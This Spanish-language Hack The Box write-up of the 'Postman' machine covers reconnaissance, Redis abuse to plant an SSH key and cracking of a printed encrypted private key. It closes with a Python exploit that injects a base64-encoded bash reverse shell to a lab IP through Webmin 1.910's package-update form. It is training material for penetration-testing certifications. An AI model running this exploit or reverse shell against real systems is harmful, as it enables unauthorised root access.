---
title: Postman
published: 2025-08-11
image: "./logo.png"
tags: [Easy, Information Leakage, PFsense, Abusing RRD Graphs, RCE, Evasion Techniques, eWPT, eWPTXv2, OSWE]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Redis Enumeration
- Redis Exploitation - Write SSH Key
- Webmin Exploitation - Python Scripting
- We create our own exploit in Python - AutoPwn [Ruby code adaptation from Metasploit]

### Preparación

- eWPT
- eWPTXv2
- OSWE

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.160 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.160`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
6379/tcp  open  redis            syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar" wrap=false
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p22,80,6379,10000 10.10.10.160 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.160`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
❯ whatweb http://10.10.10.160
http://10.10.10.160 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.160], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edge]
```

### Web (80)

Vemos que en el puerto **80** hay una simple web:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FRgG7az5dEeQd8SOxqTLr%2Fimage.png?alt=media&#x26;token=d12478a3-004f-4e32-9f11-35157c322702" alt=""><figcaption></figcaption></figure>

### Webmin (10000)

En el puerto **10000** hay un servicio llamado **Webmin**:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FoFGCSY2SEYMZRxsZtAn4%2Fimage.png?alt=media&#x26;token=b5493398-9c15-4c61-a9d4-3a5ea1b999c1" alt=""><figcaption></figcaption></figure>

### Redis (6379)

En este puerto encontramos el servicio **Redis** en el cual nos podemos conectar con el siguiente comando:

```
redis-cli -h 10.10.10.160
```

## Explotación

Buscando información sobre este servicio, encontramos bastante en <a href="https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html" class="button secondary" data-icon="book-blank">HackTricks</a>.

Allí podemos ver una serie de pasos que seguiremos para conectarnos a la máquina:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1qdNcH7DHoqHnLwjwfds%2Fimage.png?alt=media&#x26;token=04adf660-cb38-4026-9503-648dcc6dd7a5" alt=""><figcaption></figcaption></figure>

```
redis@Postman:~$ whoami
redis
```

## Escalada de privilegios

Además del usuario **Matt**, no encontramos nada más interesante dentro de la máquina excepto un **id\_rsa** protegido por contraseña dentro de la ruta **/opt**:

```txt wrap=false
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Para crackearlo utilizaremos la herramienta **ssh2john** para convertirlo en un **hash** crackeable por dicha herramienta:

```txt wrap=false
id_rsa:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bc
c3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f026
95c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f13
2be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29b
cafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfc
e0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df31
0ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d3902
2507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216ae
c90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d0
80aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3
eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59
ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c3627
5f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d
8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
```

Y con el diccionario **rockyou.txt**, obtendremos la contraseña:

```
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)     
1g 0:00:00:00 DONE (2025-08-11 11:23) 4.545g/s 1121Kp/s 1121Kc/s 1121KC/s confused6..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Si hacemos `su Matt` y ponemos esa contraseña funciona. Por lo que ahora toca escalar a **root:**

```
Matt@Postman:~$ cat user.txt 
3cd169f4288a4e3...
```

Sabiendo que tenemos estas credenciales, podríamos probarlas en el **Webmin**:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FGP1FxlLtnBjnXqkWukYX%2Fimage.png?alt=media&#x26;token=e34f2fdd-0fcd-4bac-8fe6-5b690671f191" alt=""><figcaption></figcaption></figure>

Sabiendo que la versión es la **1.910** podemos buscar algun exploit:

```bash wrap=false
❯ searchsploit Webmin 1.910
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                               | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                        | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

El primero es interesante, lo vamos a pasar a python de la siguiente forma:

```python wrap=false title="Script de S4vitar"
#!/usr/bin/python3

from pwn import *
import requests, urllib3, pdb, signal, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://10.10.10.160:10000/session_login.cgi"
update_url = "https://10.10.10.160:10000/package-updates/update.cgi"

def makeRequest():
    
    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False

    data_post = {
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = {
        'Cookie': 'redirect=1; testing=1; sid=x'
    }

    r = s.post(login_url, data=data_post, headers=headers)
    
    post_data = [('u', 'acl/apt'),('u', ' | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYx | base64 -d | bash"'), ('ok_top', 'Update Selected Packages')]

    headers = {
        'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
    }

    r = s.post(update_url, data=post_data, headers=headers)
    print(r.text)

if __name__ == "__main__":
    makeRequest()
```

```
root@Postman:/usr/share/webmin/package-updates/# whoami
root
root@Postman:~# cat root.txt 
1ef6255998db7351...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/215)

---